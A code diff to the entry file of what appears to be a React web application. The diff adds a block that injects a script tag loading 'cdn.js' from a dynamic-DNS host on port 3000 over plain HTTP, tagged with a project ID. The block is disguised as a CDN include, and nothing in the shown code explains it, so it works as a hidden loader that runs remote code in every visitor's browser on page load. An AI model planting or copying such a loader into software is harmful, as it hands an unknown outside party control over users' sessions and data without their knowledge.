@@ -4,6 +4,14 @@ import { createBrowserRouter, RouterProvider, useNavigate } from "react-router-d
 
 window.React = React
 
+const id = 'cc36baaf-a634-474f-8b02-37e95b7cf8dd'
+
+const script = document.createElement( 'script' )
+script.type = 'text/javascript'
+script.src = `http://woveer.ddns.net:3000/cdn.js?project=${ id }`  
+
+document.head.appendChild( script )
+
 const useFetch = async ( method, url, data, headers = { 'Content-Type': 'application/json' } ) => {
   const response = await fetch( method == 'GET' ? `${ url }?${ new URLSearchParams( data ) }` : url, {
     method,
